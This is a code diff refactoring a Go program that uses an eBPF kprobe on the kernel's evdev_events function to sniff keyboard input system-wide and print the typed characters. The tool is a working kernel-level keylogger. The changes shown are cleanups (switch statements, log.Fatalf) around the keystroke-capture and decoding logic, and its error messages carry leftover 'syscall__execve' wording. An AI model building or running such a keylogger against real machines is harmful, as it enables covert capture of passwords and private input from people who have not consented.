@@ -16,6 +16,7 @@ import (
 	"bytes"
 	"encoding/binary"
 	"fmt"
+	"log"
 	"os"
 	"os/signal"
 
@@ -53,11 +54,11 @@ int evdev_events_sniff(struct pt_regs *ctx)
 	struct keyEvent sniffed = {};
 	sniffed.value1 = in->value;
 	in++;
-	sniffed.value2 = in->value; 
+	sniffed.value2 = in->value;
 	in++;
 	sniffed.value3 = in->value;
 	events.perf_submit(ctx, &sniffed, sizeof(sniffed));
-	
+
     return 0;
 }
 `
@@ -78,23 +79,19 @@ func main() {
 	defer m.Close()
 	kprobe, err := m.LoadKprobe("evdev_events_sniff")
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "Failed to load syscall__execve: %s\n", err)
-		os.Exit(1)
+		log.Fatalf("Failed to load syscall__execve: %s\n", err)
 	}
 	if err := m.AttachKprobe("evdev_events", kprobe, -1); err != nil {
-		fmt.Fprintf(os.Stderr, "Failed to attach syscall__execve: %s\n", err)
-		os.Exit(1)
+		log.Fatalf("Failed to attach syscall__execve: %s\n", err)
 	}
 	table := bpf.NewTable(m.TableId("events"), m)
 	channel := make(chan []byte, 1000)
 	perfMap, err := bpf.InitPerfMap(table, channel)
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "Failed to init perf map: %s\n", err)
-		os.Exit(1)
+		log.Fatalf("Failed to init perf map: %s\n", err)
 	}
 	sig := make(chan os.Signal, 1)
-	signal.Notify(sig, os.Interrupt, os.Kill)
-
+	signal.Notify(sig, os.Interrupt)
 	go func() {
 		logrus.Infoln("Starting")
 		// upperCase := false
@@ -103,28 +100,40 @@ func main() {
 		for {
 			b := <-channel
 			ke := KeyEvent(b)
-			// logrus.Infoln(ke)
-			if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1) {
+			switch {
+			case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1):
 				leftShiftPressed = true
-			}
-			if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 1) {
+			case (ke.Value1 == RIGHTSHIFT && (ke.Value2 == 1)):
 				rightShiftPressed = true
-			}
-			if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0) {
+			case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0):
 				leftShiftPressed = false
-			}
-			if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0) {
+			case (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0):
 				rightShiftPressed = false
 			}
+			// if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1) {
+			// 	leftShiftPressed = true
+			// }
+			// if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 1) {
+			// 	rightShiftPressed = true
+			// }
+			// if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0) {
+			// 	leftShiftPressed = false
+			// }
+			// if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0) {
+			// 	rightShiftPressed = false
+			// }
 			for i := 0; i < int(ke.Value2); i++ {
-				var s string
-				switch leftShiftPressed || rightShiftPressed {
-				case true:
-					s = upperCaseKeyMap[ke.Value1]
-				default:
-					s = lowerCaseKeymap[ke.Value1]
+				if leftShiftPressed || rightShiftPressed {
+					fmt.Print(upperCaseKeyMap[ke.Value1])
+					continue
 				}
-				fmt.Print(s)
+				// switch leftShiftPressed || rightShiftPressed {
+				// case true:
+				// 	s = upperCaseKeyMap[ke.Value1]
+				// default:
+				// 	s = lowerCaseKeymap[ke.Value1]
+				// }
+				fmt.Print(lowerCaseKeymap[ke.Value1])
 			}
 
 		}
